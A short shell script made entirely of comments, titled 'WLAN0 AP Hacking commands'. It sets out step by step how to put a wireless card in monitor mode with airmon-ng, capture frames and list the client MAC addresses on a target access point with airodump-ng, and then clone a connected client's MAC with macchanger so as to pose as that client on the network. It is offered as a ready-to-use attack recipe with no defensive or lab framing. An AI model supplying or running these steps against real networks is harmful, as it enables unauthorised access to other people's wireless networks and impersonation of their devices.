#!/bin/zsh

# WLAN0 AP Hacking commands

# iwconfig - shows wlan info
# iwlist - will list all available AP(access points within your ditance range) - reveals Mac, channel, Frequency, ESSID, Mode
# airmon-ng start wlan0 - switches to monitor mode 
# airmon-ng check kill - use this command, if any problem occurs while use above command
# airodump-ng wlan0mon - Capturing frames  
# airodump-ng -c 11 -a -bssid <mac of AP> - reveals all mac addresses of clients 
# ifconfig wlan0 down - shuts off internet
# macchanger -m <mac address of client that connected to AP> wlan0 - will copy mac address one of real clients AP and insert to your host
# ifconfig wlan0 up - turns on internet
# And you are ready to go, you will pretend AP as one of the actual clients